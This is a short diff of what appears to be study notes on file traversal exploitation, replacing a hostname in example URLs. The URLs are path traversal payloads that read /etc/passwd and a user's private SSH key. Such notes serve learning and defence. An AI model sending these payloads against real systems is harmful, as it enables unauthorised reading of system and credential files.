@@ -10,7 +10,7 @@ How file traversal can be exploited.
 ```text
 http://example.local/meteor/index.php?page=../../../../../../../../../etc/passwd
 
-http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+http://example.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
 ```
 
 ## Character Encoding
